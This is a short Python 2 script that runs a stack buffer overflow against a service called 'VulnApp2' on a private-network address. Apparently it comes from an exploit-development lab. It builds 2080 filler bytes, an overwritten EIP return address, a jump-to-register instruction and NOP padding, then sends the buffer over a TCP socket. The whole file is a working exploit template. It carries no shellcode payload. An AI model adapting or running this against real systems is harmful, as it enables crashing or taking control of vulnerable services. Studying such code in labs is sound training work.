#!/usr/bin/python
import socket
import time


payload = "A" * 2080
EIP = "\x3d\x11\x80\x14"
offset = "\xff\xe1"
slad = "\x90" * (12 - int(len(offset)))

try:
  print "[*] Starting buffer overflow against VulnApp2: cop-6s"
  
  mybuffer = payload + EIP + offset + slad
  
  print "[*] Buffer setup size is: " + str(len(mybuffer)) 
  time.sleep(1)
  print "[*] Sending evil payload"
  time.sleep(1)
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.128.10", 7002))
  s.send(mybuffer)
  s.close()

  print "[*] Done!"
  
except:
  print "[*] Error occure could not connect!"


